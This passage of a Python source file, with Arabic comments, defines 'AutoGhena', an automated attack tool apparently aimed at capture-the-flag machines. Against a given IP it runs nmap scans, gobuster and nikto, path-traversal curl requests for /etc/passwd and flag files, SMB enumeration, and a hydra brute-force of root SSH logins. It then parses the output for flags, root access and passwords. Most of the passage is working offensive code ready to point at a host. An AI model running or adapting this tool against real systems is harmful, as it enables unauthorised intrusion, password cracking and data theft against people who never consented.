# ======================= المحرك التلقائي =======================
class AutoGhena:
    def __init__(self, target_ip: str):
        self.ip = target_ip
        self.open_ports = []
        self.services = {}
        self.findings = []
        self.flag_found = False
        self.root_found = False
        self.executed_commands = []
        
        # إنشاء مجلد للنتائج
        self.session_dir = Path(f"GHENA_AUTO_{target_ip}_{int(time.time())}")
        self.session_dir.mkdir(exist_ok=True)
        
    def log(self, msg, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color_map = {
            "info": COLORS["OKBLUE"],
            "success": COLORS["OKGREEN"],
            "warning": COLORS["WARNING"],
            "error": COLORS["FAIL"],
            "critical": COLORS["FAIL"],
            "header": COLORS["HEADER"]
        }
        color = color_map.get(level, COLORS["OKBLUE"])
        print(f"{color}[{timestamp}] {msg}{COLORS['ENDC']}")
        
    def is_safe(self, cmd):
        cmd_lower = cmd.lower()
        for pattern in BLOCKED_PATTERNS:
            if pattern in cmd_lower:
                return False
        return True
        
    def execute(self, cmd, timeout=600):
        if not self.is_safe(cmd):
            self.log(f"⚠️ أمر غير آمن: {cmd}", "warning")
            return ""
            
        self.log(f"⚡ تنفيذ: {cmd}", "info")
        
        try:
            result = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT,
                text=True, timeout=timeout
            )
            self.executed_commands.append(cmd)
            
            # تحليل النتيجة
            self.analyze_output(result, cmd)
            
            # حفظ النتيجة
            with open(self.session_dir / f"cmd_{len(self.executed_commands)}.txt", "w") as f:
                f.write(f"Command: {cmd}\n\n{result}")
                
            return result
        except Exception as e:
            self.log(f"❌ خطأ: {e}", "error")
            return ""
            
    def analyze_output(self, output, cmd):
        # استخراج المنافذ من nmap
        if "nmap" in cmd:
            pattern = r"(\d+)/tcp\s+open\s+(\S+)"
            for port, service in re.findall(pattern, output):
                port = int(port)
                if port not in self.open_ports:
                    self.open_ports.append(port)
                    self.services[port] = service
                    self.log(f"🔓 منفذ جديد: {port} ({service})", "success")
                    
        # البحث عن العلم
        flag_pattern = r"flag\{[^}]+\}|FLAG\{[^}]+\}"
        flag_match = re.search(flag_pattern, output)
        if flag_match:
            flag = flag_match.group(0)
            self.findings.append(f"FLAG: {flag}")
            self.log(f"🎯 العلم موجود: {flag}", "critical")
            self.flag_found = True
            
            # حفظ العلم
            with open(self.session_dir / "FLAG.txt", "w") as f:
                f.write(flag)
                
        # البحث عن صلاحيات الجذر
        if re.search(r"# |root:", output):
            self.findings.append("ROOT ACCESS ACHIEVED")
            self.log("🔓 تم الوصول إلى صلاحيات الجذر!", "critical")
            self.root_found = True
            
        # البحث عن كلمات مرور
        pass_pattern = r"password:?\s+\S+|pass:?\s+\S+"
        pass_match = re.search(pass_pattern, output, re.IGNORECASE)
        if pass_match:
            self.findings.append(f"PASSWORD: {pass_match.group(0)}")
            self.log(f"🔑 كلمة مرور: {pass_match.group(0)}", "success")
            
    def run_scan(self):
        """تنفيذ الهجوم التلقائي الكامل"""
        self.log("=" * 60, "header")
        self.log(f"🚀 بدء الهجوم التلقائي على {self.ip}", "header")
        self.log("=" * 60, "header")
        
        # 1. فحص أولي
        self.log("\n[ المرحلة 1: الفحص الأولي ]", "header")
        nmap_cmd = f"nmap -sV -T4 {self.ip}"
        self.execute(nmap_cmd)
        
        # 2. فحص جميع المنافذ إذا كان العدد قليل
        if len(self.open_ports) < 10:
            self.log("\n[ المرحلة 2: فحص جميع المنافذ ]", "header")
            full_nmap = f"nmap -sC -sV -p- -T4 {self.ip}"
            self.execute(full_nmap)
            
        # 3. تنفيذ هجمات حسب الخدمات المكتشفة
        if self.open_ports:
            self.log("\n[ المرحلة 3: هجمات مخصصة حسب الخدمات ]", "header")
            
            for port in self.open_ports:
                service = self.services.get(port, "").lower()
                
                # هجمات الويب
                if port in [80, 443, 8080, 8443] or "http" in service:
                    self.log(f"\n🌐 فحص الويب على المنفذ {port}", "header")
                    
                    # Gobuster
                    gb_cmd = f"gobuster dir -u http://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50"
                    self.execute(gb_cmd)
                    
                    # Nikto
                    nikto_cmd = f"nikto -h http://{self.ip}:{port}"
                    self.execute(nikto_cmd)
                    
                    # LFI Test
                    lfi_cmd = f"curl -s 'http://{self.ip}:{port}/?page=../../../../etc/passwd'"
                    self.execute(lfi_cmd)
                    
                # SMB
                if port in [139, 445] or "smb" in service or "microsoft-ds" in service:
                    self.log(f"\n📁 فحص SMB", "header")
                    self.execute(f"enum4linux -a {self.ip}")
                    self.execute(f"smbclient -L //{self.ip} -N")
                    
                # FTP
                if port == 21 or "ftp" in service:
                    self.log(f"\n📂 فحص FTP", "header")
                    self.execute(f"nmap --script ftp-anon -p 21 {self.ip}")
                    
                # SSH
                if port == 22 or "ssh" in service:
                    self.log(f"\n🔐 فحص SSH", "header")
                    self.execute(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{self.ip} -t 4")
                    
        # 4. بحث متقدم عن العلم في المسارات الشائعة
        if not self.flag_found and any(p in [80, 443, 8080, 8443] for p in self.open_ports):
            self.log("\n[ المرحلة 4: بحث متقدم عن العلم ]", "header")
            
            common_flag_paths = [
                "/flag.txt", "/root/flag.txt", "/home/*/flag.txt",
                "/var/www/flag.txt", "/tmp/flag.txt", "/flag",
                "/root/root.txt", "/root/root.flag", "/.flag"
            ]
            
            for port in [p for p in self.open_ports if p in [80, 443, 8080, 8443]]:
                for path in common_flag_paths:
                    if self.flag_found:
                        break
                    flag_cmd = f"curl -s 'http://{self.ip}:{port}/?page=../../../../..{path}'"
                    self.execute(flag_cmd)
                    
        # 5. تقرير نهائي
        self.generate_report()
        
    def generate_report(self):
        """توليد التقرير النهائي"""
        report = f"""
╔═══════════════════════════════════════════════════════════════╗
║                 تقرير الهجوم التلقائي                        ║
╠═══════════════════════════════════════════════════════════════╣
║ الهدف: {self.ip}
║ المنافذ المفتوحة: {self.open_ports}
║ الخدمات: {json.dumps(self.services, indent=2, ensure_ascii=False)}
╠═══════════════════════════════════════════════════════════════╣
║ النتائج:
"""
        for finding in self.findings:
            report += f"\n  ✅ {finding}"
            
        if self.flag_found:
            with open(self.session_dir / "FLAG.txt", "r") as f:
                flag = f.read().strip()
            report += f"\n\n🎯 العلم النهائي: {flag}"
            
        report += "\n\n╚═══════════════════════════════════════════════════════════════╝"
        
        print(report)
        with open(self.session_dir / "FINAL_REPORT.txt", "w") as f:
            f.write(report)
            
        self.log(f"\n📄 التقرير محفوظ في: {self.session_dir}/FINAL_REPORT.txt", "success")
        
        # طباعة العلم مباشرة إذا وجد
        if self.flag_found:
            with open(self.session_dir / "FLAG.txt", "r") as f:
                flag = f.read().strip()
            print(f"\n{COLORS['OKGREEN']}{'='*60}{COLORS['ENDC']}")
            print(f"{COLORS['BOLD']}{COLORS['OKGREEN']}🎯 العلم: {flag}{COLORS['ENDC']}")
            print(f"{COLORS['OKGREEN']}{'='*60}{COLORS['ENDC']}")

